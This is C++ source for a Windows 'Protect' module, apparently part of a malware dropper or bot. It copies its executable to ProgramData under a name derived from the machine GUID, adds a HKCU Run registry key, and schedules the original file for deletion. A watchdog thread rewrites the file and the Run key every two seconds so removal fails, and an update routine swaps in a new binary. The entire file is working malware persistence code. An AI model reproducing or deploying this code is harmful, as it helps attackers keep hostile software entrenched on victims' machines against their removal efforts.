#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "protect.h"
#include "dropper.h"
#include "server.h"
#include "config.h"

#include "utils.h"
#include "seccfg.h"
#include "peldr.h"


BOOLEAN g_bStopProt = FALSE;
HANDLE g_hProtectThread;

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Protect::UpdateMain(PVOID Buffer, DWORD Size)
{
	BOOLEAN Result = FALSE;

	DbgMsg(__FUNCTION__"(): start update...\r\n");

	g_bStopProt = TRUE;
	WaitForSingleObject(g_hProtectThread, INFINITE);

	CHAR NewFileName[MAX_PATH];
	GetNewPath(NewFileName, ".exe");

	Utils::DeleteFileReboot(NewFileName);
	if (Result = Utils::FileWrite(NewFileName, CREATE_ALWAYS, Buffer, Size))
	{
		DbgMsg(__FUNCTION__"(): EXE UPDATED !!!\r\n");
	}

	g_bStopProt = FALSE;
	Utils::ThreadCreate(Protect::ProtectThread, NULL, &g_hProtectThread);

	DbgMsg(__FUNCTION__"(): end update...\r\n");

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Protect::ProtectThread(PVOID Context)
{
	BOOLEAN bOk = FALSE;
	CHAR NewFilePath[MAX_PATH];
	PVOID FileBuffer;
	DWORD FileSize;
	HANDLE hFile = 0;

	GetNewPath(NewFilePath, ".exe");
	while (TRUE)
	{
		if (FileBuffer = Utils::FileRead(NewFilePath, &FileSize))
		{
			if (hFile != INVALID_HANDLE_VALUE) break;
		}

		if (g_bStopProt) 
		{
			ExitThread(ERROR_SUCCESS);
			break;
		}

		Sleep(1000);
	}

	while (TRUE)
	{
		if (Utils::FileWrite(NewFilePath, CREATE_ALWAYS, FileBuffer, FileSize))
		{
			//DbgMsg(__FUNCTION__"(): rewriteted\r\n");
		}

		AddKeyToRun(NewFilePath);
		
		if (g_bStopProt)
		{
			ExitThread(ERROR_SUCCESS);
			break;
		}

		Sleep(2000);
	}

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Protect::StartProtect()
{
	CHAR OldPath[MAX_PATH];
	CHAR NewFileName[MAX_PATH];

	Config::RegReadString("CurrentPath", OldPath, RTL_NUMBER_OF(OldPath));

	DbgMsg(__FUNCTION__"(): Old: '%s'\r\n", OldPath);

	if (WriteFileToNewPath(OldPath, NewFileName))
	{
		DbgMsg(__FUNCTION__"(): New: '%s'\r\n", NewFileName);
	}
	else
	{
		lstrcpy(NewFileName, OldPath);
		DbgMsg(__FUNCTION__"(): WriteFileToNewPath error\r\n");
	}

	if (!AddKeyToRun(NewFileName))
	{
		DbgMsg(__FUNCTION__"(): AddKeyToRun error\r\n");
	}

	if (lstrcmpi(NewFileName, OldPath)) Utils::DeleteFileReboot(OldPath);
	Config::RegWriteString("CurrentPath", NewFileName);

	g_bStopProt = FALSE;
	Utils::ThreadCreate(ProtectThread, NULL, &g_hProtectThread);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Protect::GetFileNameFromGuid(PCHAR Guid, PCHAR Name)
{
	int j = 0;

	for (int i = 0; i < (int)strlen(Guid); i++)
	{
		if (isalpha(Guid[i])) Name[j++] = tolower(Guid[i]);
	}
	Name[j] = '\0';
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Protect::GetStorageFolderPath(PCHAR Path)
{
	SHGetFolderPath(0, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, Path);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Protect::GetNewPath(PCHAR Path, PCHAR Ext)
{
	CHAR AppDataPath[MAX_PATH];
	CHAR NewFileName[MAX_PATH];

	GetStorageFolderPath(AppDataPath);
	GetFileNameFromGuid(Drop::GetMachineGuid(), NewFileName);
	lstrcat(NewFileName, Ext);
	PathCombine(Path, AppDataPath, NewFileName);
}

BOOLEAN Protect::WriteFileToNewPath(PCHAR CurrentFilePath, PCHAR NewFileName)
{
	BOOLEAN bOk = FALSE;
	PVOID FileBuffer;
	DWORD FileSize;

	GetNewPath(NewFileName, ".exe");
	if (FileBuffer = Utils::FileRead(CurrentFilePath, &FileSize))
	{
		bOk = Utils::FileWrite(NewFileName, CREATE_ALWAYS, FileBuffer, FileSize);
		if (!bOk)
		{
			DbgMsg(__FUNCTION__"(): FileWrite error %x\r\n", GetLastError());
		}

		free(FileBuffer);
	}
	else
	{
		DbgMsg(__FUNCTION__"(): FileRead '%s' error %x\r\n", CurrentFilePath, GetLastError());
	}

	return bOk;
}

BOOLEAN Protect::AddKeyToRun(PCHAR NewFilePath)
{
	LONG St;
	HKEY hKey;
	DWORD dwDisposition;
	CHAR KeyName[MAX_PATH];
	CHAR TrueName[MAX_PATH];
	CHAR ReadedName[MAX_PATH];
	DWORD dwType = REG_SZ;
	BOOLEAN bKeyOk = FALSE;

	GetFileNameFromGuid(Drop::GetMachineGuid(), KeyName);
	St = RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE|KEY_READ, NULL, &hKey, &dwDisposition);
	if (St == ERROR_SUCCESS)
	{
		DWORD cbData = sizeof(MAX_PATH);
		DWORD dwSize = _snprintf(TrueName, sizeof(TrueName)-1, "\"%s\"", NewFilePath);

		St = RegQueryValueEx(hKey, KeyName, NULL, &dwType, (LPBYTE)&ReadedName, &cbData);
		if (St == ERROR_SUCCESS)
		{
			bKeyOk = !lstrcmp(ReadedName, TrueName);
		}
		if (!bKeyOk) bKeyOk = RegSetValueEx(hKey, KeyName, 0, REG_SZ, (LPBYTE)TrueName, dwSize) == ERROR_SUCCESS;

		RegCloseKey(hKey);
	}

	return bKeyOk;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
